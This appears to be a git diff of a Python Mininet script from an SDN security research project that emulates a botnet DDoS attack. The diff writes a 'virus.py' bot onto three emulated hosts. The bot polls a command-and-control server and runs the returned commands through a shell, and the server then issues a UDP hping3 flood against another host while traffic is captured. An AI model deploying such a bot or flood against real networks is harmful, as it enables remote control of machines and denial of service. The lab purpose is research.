@@ -1,4 +1,5 @@
 import time
+from pathlib import Path
 from subprocess import Popen
 
 from mininet.net import Mininet
@@ -50,13 +51,39 @@ def create_network():
     net.start()
 
     # Run a simple webserver on h5 (attacker node (C2 Server))
-    h6.cmd("python3 -m http.server -d /var/www/html 80 &")
+    h6.cmd("echo 'ls' > command")
+    h6.cmd("python3 -m http.server 80 &> /tmp/server.log &")
+
+    print("[+] Waiting for the C2 server to be ready...")
+    time.sleep(2)
+
+    out = h2.cmd("curl http://10.42.0.6/command")
+    if "ls" not in out:
+        print("[+] Failed to setup the C2 server. Please check the network configuration.")
+        print(h6.cmd("cat /tmp/server.log"))
+        return
 
     # Simulate Infection
     for host in [h2, h4, h5]:
         # host.cmd('wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py -O virus.py')
-        host.cmd('echo "import time\nimport urllib.request\nimport subprocess\n\nurl = \"http://10.42.0.6/command\"\n\nwhile True:\n    response = urllib.request.urlopen(url)\n    command = response.read().decode(\'utf-8\').strip()\n\n    print(command)\n\n    if command:\n        subprocess.call(command, shell=True)\n\n    time.sleep(10)" > virus.py')
-        print(host.cmd('python3 virus.py &'))
+        virus = """import time
+import urllib.request
+import subprocess
+
+url = \\"http://10.42.0.6/command\\"
+
+while True:
+    response = urllib.request.urlopen(url)
+    command = response.read().decode(\\"utf-8\\").strip()
+    
+    if command:
+        subprocess.call(command, shell=True)
+        
+    time.sleep(10)
+        """
+        host.cmd(f"echo \"{virus}\" > virus.py")
+        host.cmd('python3 virus.py &> output.txt &')
+        #host.cmd('sudo hping3 --flood --udp 10.42.0.1 &')
 
     # Start Monitoring
     print("[+] Starting monitoring...")
@@ -70,20 +97,20 @@ def create_network():
             Popen(f"rm /tmp/s{i}-eth{j}.pcap", shell=True).wait()
             Popen(f"tcpdump -i s{i}-eth{j} -w /tmp/s{i}-eth{j}.pcap &", shell=True).wait()
 
+    time.sleep(1)
+
     net.pingAll()
 
     # Wait for the network to stabilize
     print("[+] Waiting for the network to stabilize...")
-    time.sleep(10)
+    time.sleep(5)
 
     print("[+] Starting the attack...")
 
     # Start the attack
-    h5.cmd('echo "sudo hping3 --flood --udp 10.42.0.1 &" > /var/www/html/command')
-
-    if "Failed to connect to localhost port 80" in h2.cmd('curl http://10.42.0.6/command'):
-        print("[+] Failed to setup the C2 server. Please check the network configuration.")
-        return
+    cmd = f"sudo hping3 --flood --udp {h1.IP()} &"
+    print(f"    [+] Running: {cmd}")
+    h5.cmd(f"echo \"{cmd}\" > command")
 
     print("[+] Waiting for the attack to take effect...")
     time.sleep(10)
@@ -96,6 +123,8 @@ def create_network():
     except KeyboardInterrupt:
         pass
 
+    time.sleep(1)
+
     print("[+] Stopping the attack...")
 
     for host in [h2, h4, h5]:
@@ -103,7 +132,7 @@ def create_network():
         host.cmd('killall hping3')
 
     # Wait for the network to stabilize
-    time.sleep(10)
+    time.sleep(2)
 
     # Stop the capturing
     print("[+] Stopping the capturing...")
@@ -113,12 +142,19 @@ def create_network():
     print("[+] Stopping the monitoring...")
     Popen("killall bwm-ng", shell=True).wait()
 
+    # Copy logs
+    print("[+] Copying logs...")
+    for host in [h2, h4, h5]:
+        Path(f"/tmp/{host.name}.txt").write_text(host.cmd("cat output.txt"))
+
+    Path("/tmp/server.log").write_text(h6.cmd("cat /tmp/server.log"))
+
     # Stop the network
     print("[+] Stopping the network...")
     net.stop()
 
     print("[+] Tarring the results...")
-    Popen("tar -czvf /tmp/results.tar.gz /tmp/mon.csv /tmp/s*.pcap", shell=True).wait()
+    Popen("tar -czvf /tmp/results.tar.gz /tmp/mon.csv /tmp/s*.pcap /tmp/*.txt", shell=True).wait()
 
 if __name__ == '__main__':
     setLogLevel('info')
